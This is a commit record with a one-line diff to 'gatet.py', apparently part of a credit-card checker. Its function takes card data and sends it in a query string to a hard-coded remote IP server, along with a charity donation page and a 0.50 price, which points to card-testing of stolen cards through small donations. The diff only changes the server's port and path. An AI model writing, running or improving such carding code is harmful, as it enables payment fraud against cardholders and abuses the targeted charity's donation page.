e5368580e4f20e9157f72e82544540be6b5d4ba4
maxcdavid77-max <maxcdavid77@gmail.com>
2026-03-15 13:47:31 +0200

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -3,5 +3,5 @@ def chkk(ccx):
 	cc=ccx.strip()
 	urll="https://nkomo.org/donation-page/"
 	price="0.50"
-	res=requests.get(f'http://151.247.197.54:5500/paypal?cc={cc}&url={urll}&price={0.50}').text
+	res=requests.get(f'http://151.247.197.54:5000/tome?cc={cc}&url={urll}&price={0.50}').text
 	return res
